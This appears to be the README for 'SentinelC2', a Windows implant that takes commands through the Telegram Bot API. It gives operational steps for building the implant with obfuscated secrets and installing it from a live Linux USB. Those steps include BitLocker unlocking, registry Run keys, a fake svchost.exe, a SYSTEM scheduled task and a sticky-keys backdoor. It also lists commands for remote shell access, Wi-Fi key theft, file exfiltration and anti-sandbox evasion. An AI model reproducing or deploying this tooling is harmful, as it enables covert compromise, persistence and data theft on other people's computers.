# SentinelC2 / Telegram variant

Single-file Windows implant that uses the **Telegram Bot API** as its C2
channel. Same operator workflow as the main `agent.nim`, but the C2
transport is the public Telegram Bot API — no custom server, no VPS, no
port-forward, no IP exposure. The agent long-polls `getUpdates` over
HTTPS and exfils via `sendMessage` / `sendDocument`.

```
+--------------------+       TLS       +--------------+      +----------------+
|  target (Windows)  |  <----------->  |  Telegram    | <--> | operator phone |
|  agent_telegram    |   api.telegram. |  Bot API     |      |  Telegram app  |
|  .exe              |    org          +--------------+      +----------------+
+--------------------+
```

**Target:** Windows 10/11 laptop, no EDR (out-of-scope per engagement
brief). IAT: KERNEL32.dll, USER32.dll, msvcrt.dll, wininet.dll, shell32.dll.
No ntdll, no amsi.

---

## Files

| File                  | Role                                               |
| --------------------- | -------------------------------------------------- |
| `agent_telegram.nim`  | The implant (single file, stdlib + winim only)     |
| `build_telegram.ps1`  | XOR-encodes the token/chat, generates a random mutex, compiles |
| `deploy_telegram.sh`  | Live-Linux-USB installer (mount, registry, sticky-keys)  |
| `README.md`           | This file                                          |

---

## 1. Operator setup (one time)

### 1.1 Create the bot

1. In Telegram, message **@BotFather**.
2. `/newbot` → follow the prompts → copy the **token** (looks like
   `123456789:AAH-abc...`).
3. Send **any** message to your new bot (the agent needs at least one
   inbound message to learn your chat id).
4. Open this URL in a browser, replacing `<TOKEN>` with your bot token:
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
5. Look for `"chat":{"id":123456789,...}` (or a negative number for a
   group) — that's your **chat id**.

### 1.2 Build the agent

```powershell
# Pass flags
.\build_telegram.ps1 `
    -BotToken "123456789:AAH-..." `
    -ChatId   "-1001234567890" `
    -Output   "build\agent_telegram.exe"

# Or set env vars
$env:TG_BOT_TOKEN = "123456789:AAH-..."
$env:TG_CHAT_ID   = "-1001234567890"
.\build_telegram.ps1
```

The script:

1. Generates a fresh 16-byte **XOR key** for this build (written to
   `xorkey.nim`, deleted after compile).
2. XOR-encodes the bot token, chat id, and a random mutex name with
   that key — the cleartext **never appears** in the binary's `.rdata`.
3. Injects the encoded byte arrays into `agent_telegram.nim` and
   compiles it.
4. Cleans up `xorkey.nim` and the temp source so they don't get
   committed.

Output: `build\agent_telegram.exe` (~400 KB, single file, GUI subsystem,
stripped).

**Save the mutex seed** that the script prints. Re-running with the same
seed produces the same mutex (useful for redeploys); a fresh seed gives
you a different one (better cross-build OPSEC).

### 1.3 Verify in a VM

Before deploying on the real target, drop `agent_telegram.exe` in a
Windows VM, run it, and confirm you get `SentinelC2 / Telegram online`
in your Telegram chat. Then test commands:

```
/help
/sysinfo
/cmd whoami
/screenshot
/persist
```

---

## 2. Environment variables (runtime overrides)

The agent reads these at startup. Anything you set in the env wins
over the build-time defaults — useful when you want to re-use the same
binary for multiple engagements or quickly change behavior without a
rebuild.

| Variable                | What it does                                      |
| ----------------------- | ------------------------------------------------- |
| `TELEGRAM_BOT_TOKEN`    | bot API token (overrides baked-in)                |
| `TELEGRAM_CHAT_ID`      | target chat id (overrides baked-in)               |
| `TELEGRAM_PROXY`        | `http://host:port` proxy URL (optional)           |
| `C2_POLL_INTERVAL`      | base poll interval in seconds (default 3, min 1)  |
| `C2_POLL_TIMEOUT`       | long-poll HTTP timeout (default 30, min 5)        |
| `C2_LOG_FILE`           | path to debug log (default: logging disabled)     |
| `C2_NO_PERSIST`         | `1` to skip the first-run persistence install     |
| `C2_NO_SANDBOX_CHECK`   | `1` to skip the cheap anti-analysis checks        |
| `C2_INSTALL_DIR`        | override the install path (used by selfdestruct)   |
| `C2_INSTALL_NAME`       | override the install binary name                  |
| `C2_MUTEX_NAME`         | override the mutex name                           |

Set them before launch with `set X=Y && agent_telegram.exe` from a
`cmd`, or via a wrapper `.lnk`.

---

## 3. Deployment via live Linux USB

### 3.1 Prepare the USB

1. Flash any Linux live ISO to a USB stick (Ubuntu / Fedora / Kali all
   work; Kali is preferred because it ships with `hivexsh`).
2. Boot the target laptop from the USB (BIOS / boot menu, often F12).
3. Plug in a second USB containing `agent_telegram.exe` and
   `deploy_telegram.sh`.

### 3.2 Find the Windows partition

```bash
lsblk -f
# or
sudo fdisk -l
```

You're looking for the NTFS partition — usually `/dev/sda2`,
`/dev/nvme0n1p3`, or similar. **Note the size** to be sure you've
picked the right one (Windows = 100 GB+).

### 3.3 Handle BitLocker (if applicable)

If Windows is BitLocker-encrypted, the NTFS partition will look like
garbage. You need the recovery key first:

```bash
sudo apt install -y dislocker
sudo mkdir -p /mnt/disk /mnt/win
sudo dislocker /dev/sda2 --user-recovery-password 123456-789012-... /mnt/disk
sudo mount -o rw /mnt/disk/dislocker-file /mnt/win
# Then point deploy_telegram.sh at the mounted directory
```

### 3.4 Run the deploy

```bash
# From the USB containing the agent and the script:
sudo chmod +x deploy_telegram.sh
sudo ./deploy_telegram.sh /dev/sda2
```

Optional flags:

```bash
# Custom agent path
sudo ./deploy_telegram.sh /dev/sda2 --agent /media/usb/agent_telegram.exe

# Verify only (no writes)
sudo ./deploy_telegram.sh /dev/sda2 --verify

# Skip individual persistence mechanisms
sudo ./deploy_telegram.sh /dev/sda2 --no-stickey
sudo ./deploy_telegram.sh /dev/sda2 --no-task
sudo ./deploy_telegram.sh /dev/sda2 --no-runkey
```

What this does (in order):

1. Mounts the NTFS partition read-write at `/mnt/sentinel-target`.
2. Backs up the `SOFTWARE` and `SYSTEM` hives to `/tmp/sentinel_hive_backups_<ts>/`.
3. Drops `agent_telegram.exe` →
   `C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe`
   (a path that looks like a real Windows networking component). Sets
   hidden + system file attributes.
4. Adds `HKLM\…\Run\MicrosoftEdgeUpdate` via direct `SOFTWARE` hive edit.
5. Adds the same value to every `NTUSER.DAT` (so whichever user logs in
   first fires the agent).
6. Drops a SYSTEM-context scheduled-task XML
   (`C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachine`,
   AtLogOn + HighestAvailable + StartWhenAvailable).
7. Replaces `sethc.exe` with `cmd.exe` (saves the original to
   `sethc.exe.bak`). Press **Shift 5x** at the Windows lock screen for
   a SYSTEM shell — works before any user logs in.
8. Unmounts cleanly.

### 3.5 Reboot + wait

```bash
sudo reboot
```

Pull the USB before the Windows logo appears. Let the user log in
normally — the agent will fire from the Run key, from the scheduled
task, and the operator will see `SentinelC2 / Telegram online` in their
Telegram chat within a few seconds.

---

## 4. Operator command reference

All commands go to your bot from the chat whose id is `CHAT_ID`.

| Command              | What it does                                       |
| -------------------- | -------------------------------------------------- |
| `/help`              | Show command list                                  |
| `/cmd <command>`     | Run any shell command (PowerShell or cmd)          |
| `/shell <cmd>`       | Alias of `/cmd`                                    |
| `/sysinfo`           | Host, user, OS, admin status                       |
| `/screenshot`        | Capture primary desktop                            |
| `/ps`                | Process list (`tasklist /v /fo csv`)               |
| `/kill <pid>`        | Kill a process                                     |
| `/ls [path]`         | List directory (default `.`)                       |
| `/cat <file>`        | Read first 500 KB of a file                        |
| `/cd <path>`         | Change working directory                           |
| `/pwd`               | Print working directory                            |
| `/whoami`            | `user@host`                                        |
| `/env [name]`        | Show env var (or all)                              |
| `/drives`            | List logical drives                                |
| `/ipconfig`          | `ipconfig /all`                                    |
| `/wifi`              | Saved Wi-Fi profiles + cleartext keys              |
| `/av`                | Check for known AV/EDR processes                   |
| `/upload <path>`     | Send a file from target to your chat               |
| `/dl <file_id>`      | Download a file *to* the target (by Telegram id)   |
| `/persist`           | Re-install Run key + scheduled task + sticky-keys  |
| `/stickykeys`        | Install sticky-keys backdoor (needs admin)         |
| `/status`            | Health check: uptime, persistence, last poll       |
| `/cleanup`           | Remove all persistence (agent stays alive)         |
| `/selfdestruct`      | Remove agent + all persistence + exit              |
| `/sleep <seconds>`   | Sleep for N seconds before next poll               |
| `/exit`              | Kill the agent (persistence stays in place)        |

You can also **send a file** to the bot in the chat — the agent will
download it to `%TEMP%` and report the saved path.

---

## 5. OPSEC notes

| Concern               | Mitigation                                         |
| --------------------- | -------------------------------------------------- |
| Disk artefact         | Installed as `svchost.exe` under a system-looking path; hidden + system file attributes set on install |
| Run-key + task name   | `MicrosoftEdgeUpdate` / `MicrosoftEdgeUpdateTaskMachine` (matches a real MS scheduled task) |
| Console window        | `--app:gui` (no console flash)                     |
| Mutex                | Randomized per build (`Global\OneDriveSync<6hex>`) — operator can re-seed for re-deploys |
| Network fingerprint   | Only outbound to `api.telegram.org:443`; user-agent spoofed as Chrome 126 |
| Timing fingerprint    | Poll interval randomised ±30 %                      |
| String fingerprint    | Bot token, chat id, mutex all XOR-encoded with a per-build 16-byte key; never appear in `.rdata` in cleartext |
| Sandbox detection     | Cheap host/username/disk checks; first-run jitter; silent exit on hit |
| Self-cleanup          | `/selfdestruct` removes the binary, scheduled task, Run key, and sethc hijack in one call |
| EDR / AMSI / ETW      | **Not in scope** for this engagement. The brief says "no EDR" |

### Cleaning up

To remove the implant from the target after an engagement, two options:

**From the live system (via the agent itself):**
```
/selfdestruct
```

**From a fresh live Linux USB:**
```bash
sudo ./deploy_telegram.sh /dev/sda2 --no-task --no-stickey
sudo mount /dev/sda2 /mnt/win
sudo rm -f "/mnt/win/ProgramData/Microsoft/Network/Connections/Cm/svchost.exe"
sudo mv /mnt/win/Windows/System32/sethc.exe{.bak,}
sudo umount /mnt/win
```

---

## 6. Troubleshooting

**Agent never shows "online"**

* Check the bot token + chat id — open a chat with the bot, then visit
  `https://api.telegram.org/bot<TOKEN>/getUpdates` in a browser; you
  should see your test message.
* Make sure the target has internet and can reach `api.telegram.org`
  (a `curl https://api.telegram.org` from the target should succeed).
* Check the build: `agent_telegram.exe` is a real PE binary, not a
  zero-byte file. The build script prints the file size at the end.
* Try running `agent_telegram.exe` manually on the target with
  `C2_LOG_FILE=%TEMP%\tg.log` set. The log will show poll errors if
  the network is failing.

**Build fails with `nim compile failed`**

* Check `build\build.log` for the actual nim error. Common causes:
  - the source file got mangled (re-pull from git)
  - stale `xorkey.nim` from a previous failed run — delete it and retry
  - wrong nim version (need 2.x with `winim` 3.9+ and `nimcrypto`
    installed via nimble)

**Deploy script complains about regipy / hivexsh**

* Either tool is fine — the script picks whichever is available. To
  install on Debian / Ubuntu / Kali:
  ```bash
  sudo apt install -y libhivex-bin   # provides hivexsh
  # or
  sudo pip3 install regipy --break-system-packages
  ```

**Mount fails**

Try specifying the FS type explicitly:
```bash
sudo mount -t ntfs-3g -o rw,force /dev/sda2 /mnt/sentinel-target
```

For BitLocker see § 3.3.

**Sticky-keys doesn't work after deploy**

Windows re-applies the original `sethc.exe` on certain servicing
updates. Re-run the deploy, or run `/stickykeys` from Telegram if the
agent already has admin on the host.

**Mutex collision (agent won't start twice)**

That's by design. If you need two instances on one host (rare), build
each with a different `-MutexSeed`.

**Sandbox heuristic fires on a real laptop**

The disk-size check (< 60 GB) is the most likely false positive.
Override with `C2_NO_SANDBOX_CHECK=1` to skip the check entirely.

---

## 7. What this tool is *not*

* **Not** an EDR/AV evasion toolkit. No AMSI bypass, no ETW patching,
  no direct syscalls. The brief explicitly excludes EDR.
* **Not** a keylogger / stealer. Add one if your scope requires it —
  the `/cmd` and `/upload` commands are enough to drop one.
* **Not** a tunnel / port-forwarder. Telegram already gives you
  bidirectional comms.
* **Not** a multi-tenant controller. One bot token = one operator.
  Build per engagement (and rotate the token when the engagement
  ends).
* **Not** a stealth dropper for EDR-equipped targets. If the engagement
  brief changes and EDR is in scope, reach for the hardened
  `agent_hardened.nim` in the parent directory instead.
